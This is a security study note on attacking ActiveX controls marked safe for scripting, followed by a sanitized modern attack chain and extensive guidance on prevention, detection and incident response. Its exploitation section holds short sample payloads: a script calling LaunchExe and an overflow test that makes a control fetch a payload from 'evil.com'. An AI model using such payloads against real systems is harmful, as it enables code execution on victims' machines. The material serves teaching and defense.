## **Attacking ActiveX Controls**

### **1. Core Concept**

ActiveX is a Microsoft technology that allows embedding compiled code (usually written in C/C++) directly into webpages or applications.
When an application marks an ActiveX control as **"safe for scripting"**, any webpage (malicious or not) can call its methods on the victim’s machine.

**Why this is dangerous:**

* ActiveX controls run **with the same privileges as the user** (often full Windows user rights).
* If they have insecure methods or memory corruption bugs, you can execute arbitrary code.

---

### **2. Attack Surface Overview**

Two main vulnerability classes:

#### **A. Memory corruption bugs**

* **Example vulnerabilities**: Buffer overflows, integer overflows, format string flaws.
* Since controls are compiled in native code, these bugs lead to **RCE (Remote Code Execution)**.
* Common in **older web applications, online games, document viewers**.

#### **B. Inherently dangerous methods**

Some controls just… give attackers tools:

```text
LaunchExe(BSTR ExeName)        // Run a program
SaveFile(BSTR FileName, URL)   // Save a file from internet to disk
LoadLibrary(BSTR LibraryPath)  // Load arbitrary DLL
ExecuteCommand(BSTR Command)   // Run system command
```

If you can call these methods, you own the victim.

---

### **3. Real-World Exploitation Example**

**Step 1 — Find the Control**
In the vulnerable page’s HTML:

```html
<object id="oMyObject"
        classid="CLSID:A61BC839-5188-4AE9-76AF-109016FD8901"
        codebase="https://wahh-app.com/bin/myobject.cab">
</object>
```

* `classid` → unique identifier for the ActiveX control.
* `codebase` → where browser downloads it from.

---

**Step 2 — Check if it’s Safe for Scripting**

* Registry path:

  ```
  HKEY_CLASSES_ROOT\CLSID\<CLASSID>\Implemented Categories\
  ```
* Look for subkey:

  ```
  7DD95801-9882-11CF-9FA9-00AA006C42C4
  ```

  ✅ If present → control is safe for scripting → **any site can call it**.

---

**Step 3 — Call Dangerous Methods**
If installed, you can trigger it directly from JS:

```html
<script>
  document.oMyObject.LaunchExe('calc.exe');
</script>
```

If no validation is in place, this executes instantly.

---

**Step 4 — Memory Corruption Payload**

* Use long strings, crafted binary data, or fuzzing payloads to crash/own the process:

```javascript
// Possible buffer overflow test
var junk = "A".repeat(5000);
document.oMyObject.SaveFile(junk, "http://evil.com/payload.exe");
```

---

### **4. HACK STEPS (Actionable)**

1. **Identify** ActiveX controls in HTML source.
2. **Extract** classid and check registry if installed.
3. **Confirm** "safe for scripting" status.
4. **Enumerate methods** using COMRaider or manual inspection.
5. **Test dangerous methods** by passing arbitrary inputs (filenames, commands, URLs).
6. **Fuzz** inputs to trigger crashes → possible RCE.

---

### **5. Tools**

* **COMRaider** → Enumerates all methods + does basic fuzzing.
* **OLE/COM Object Viewer** → Inspect and test COM methods manually.
* **Metasploit** → Has specific ActiveX module exploits.

---

### **6. Prevention (Blue Team Insight)**

* Don’t mark controls as safe for scripting unless absolutely needed.
* Remove unused/insecure methods.
* Whitelist allowed domains (`SiteLock`).
* Validate parameters strictly or cryptographically sign them.
* Never allow file system or process execution from user input.

---

✅ **Key Takeaway:**
A "safe for scripting" ActiveX control is effectively a **local API** on the victim's machine that any website can use. If it has dangerous methods or memory bugs, you can chain it for **instant code execution** — bypassing traditional web security mechanisms.

---

## A modern (2025) ActiveX attack flow — sanitized

**Context that still makes this viable in 2025**

* Many enterprises still have **legacy IE-only apps** running in **Microsoft Edge IE-mode** (where ActiveX is supported per site list).
* Some orgs retain **signed but old controls** marked *Safe for Scripting* that expose file/network methods, or have unpatched memory bugs.
* Users run with standard rights, but controls often inherit enough privileges to cause damage (data theft, persistence, lateral movement).

**High-level chain (no weaponized details)**

1. **Phish/Lure:** Attacker sends a link to a business-looking page that gently asks the user to open an internal app in **IE-mode** (or auto-opens via enterprise site list).
2. **Control presence check:** The page checks whether a specific **CLSID** is installed (common in legacy line-of-business apps). If missing, it nudges users to the “update page” (malicious), or abuses a misconfigured **codebase** that still auto-installs from an external host.
3. **Abuse of “Safe for Scripting”:** Once the control is instantiated, attacker code calls exposed methods that:

   * Interact with the filesystem (write/overwrite data, drop files), or
   * Make authenticated intranet calls using the user’s context, or
   * Trigger OS-level actions via “helper” methods.
4. **Data access or staging:** The page uses the control to read sensitive docs or exfil small records via HTTPS (blended in with normal browsing).
5. **Persistence/Follow-on:** The attacker leverages the control to create a foothold (e.g., schedule tasks, write autorun locations) *or* simply “live off the land” and return later through the same business process.

---

### What to test (safely) in your lab

> Goal: validate whether your environment is still exposed without ever running malicious payloads.

1. **Inventory & exposure**

   * Export your **Enterprise Mode Site List**; identify sites that allow IE-mode.
   * Catalog installed ActiveX **CLSIDs/OCXs** on a test machine. Note which are **Safe for Scripting**.
   * Map which business apps still instantiate controls in IE-mode.

2. **Method enumeration (read-only)**

   * Use a COM inspection tool to list methods/properties for each control.
   * Flag methods that touch **files**, **URLs**, **processes**, or **registry** (even if you don’t invoke them).

3. **Non-dangerous invocation**

   * From a test page in a quarantined VM, instantiate the control and call **benign getters** or version methods (no filesystem/process args).
   * Verify: can any random page in IE-mode call the control *without* the first-party domain present? If yes, it’s risky by design.

4. **Install/update path hygiene**

   * Confirm whether controls are only installed/updated from **internal** trusted hosts, and **codebase** isn’t pointing external.
   * Ensure signatures and **Authenticode time-stamps** are valid and pinned to your publisher.

---

### Prevent & limit impact (what actually shuts this down)

**Kill the root cause where possible**

* **Remove IE-mode** for anything not absolutely required. Shrink the site list to the minimum; review quarterly.
* **ActiveX Filtering/Block:** Use Edge GPOs/Intune to restrict ActiveX usage even in IE-mode to a **tiny allowlist**.
* **Killbit** legacy controls you no longer need (vendor-approved retirement). Maintain a **denylist of CLSIDs**.
* **Code integrity:** Enforce **WDAC** (Windows Defender Application Control) or **AppLocker** so only **signed, approved** OCX/CABs load.

**Harden what must remain**

* Require **latest vendor builds**; remove “Swiss-army” methods (file/process/network) or gate them server-side (domain pinning + signed args).
* Host update CABs **internally**; block OCX/CAB downloads from the internet at the proxy.
* Turn on **ASR rules** (Defender) that curb web-borne execution and script abuse (e.g., “Block executable content from email and webmail”, “Block persistence through WMI events”, etc.).
* Least-privilege: users as **Standard** (not local admins); remove write access to control install locations.

---

### Detect & respond (what to actually watch)

**Host telemetry (EDR/Defender/KQL ideas)**

* **New OCX registrations** / writes under:

  * `%WINDIR%\Downloaded Program Files\` and `%WINDIR%\System32\` / `SysWOW64\`
  * CLSID creation under `HKCR\CLSID\{...}`
* **IE-mode session events** from Edge plus **COM activation** of uncommon CLSIDs by browser processes.
* **Unusual file writes** by browser processes to user or temp directories right before/after OCX loads.
* **Network**: downloads of **.cab/.ocx** from non-enterprise hosts; unexpected outbound to rare domains right after control activation.

**Web proxy / CASB**

* Trigger on MIME types for CAB/OCX and block or alert when source is external.
* TLS SNI for non-corp domains immediately following IE-mode navigation.

**IR playbook (tabletop this)**

1. Triage: Was a new control installed? Which CLSID? Publisher? Hash?
2. Scope: Which users/sites invoked it? Any file or registry changes?
3. Contain: Killbit the CLSID; revoke site from IE-mode list; quarantine affected endpoints.
4. Eradicate: Remove control, clear persistence, reimage if needed.
5. Lessons: Update WDAC/AppLocker policies; shrink IE-mode list; vendor engagement.

---

### Safe purple-team exercise (non-harmful)

* **Objective:** Prove whether an arbitrary IE-mode page can instantiate and call methods on a control that’s marked Safe for Scripting.
* **Setup:** Isolated VM, test user, test control from a vendor dev SDK or your own **harmless demo OCX** that exposes *only* read-only version methods.
* **Execution:** In IE-mode, load a generic intranet page (not the first-party app), instantiate the control, and call a **version/getter** property. Log success/failure.
* **Success criteria:** If invocation works from a non-first-party page, treat every Safe-for-Scripting control as a cross-site surface and apply the prevent/detect items above.

---